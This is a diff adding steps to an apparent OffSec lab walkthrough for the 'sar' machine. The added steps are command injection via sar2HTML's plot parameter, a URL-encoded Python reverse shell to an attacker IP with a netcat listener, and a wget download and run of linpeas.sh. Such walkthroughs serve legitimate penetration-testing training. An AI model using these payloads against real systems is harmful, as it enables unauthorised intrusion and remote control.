@@ -160,5 +160,33 @@ http://192.168.223.35/sar2HTML/
 ![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/c58c4b88-64cb-4113-b971-b841f661c5e8)
 ![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/52e5d38e-d619-41e9-ad59-93883841f451)
 
-Privilege Escalation
+Manual Exploitation
+![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/cb1df527-fa04-407d-b858-a46b74333ee8)
+```
+http://192.168.223.35/sar2HTML/index.php?plot=;whoami
+```
 
+Reverse Shell
+```
+http://192.168.223.35/sar2HTML/index.php?plot=;python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.45.231%22,9090));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27
+```
+![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/4e84d691-8330-48c7-a59f-c9ce5965aaaa)
+
+```
+> rlwrap nc -nlvvp 9090
+```
+![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/3796063f-129a-4c41-bbdf-c1eff80cf73b)
+
+Privilege Escalation
+LinPEAS
+```
+www-data@sar:/tmp$ wget http://192.168.45.231/linpeas.sh
+```
+![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/2af4b81a-f610-4e8e-9062-fedde44ca54d)
+
+```
+www-data@sar:/tmp$ chmod +x linpeas.sh
+chmod +x linpeas.sh
+www-data@sar:/tmp$ ./linpeas.sh
+```
+![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/04d98692-aaaa-4733-b86e-5ebb5e19cae4)
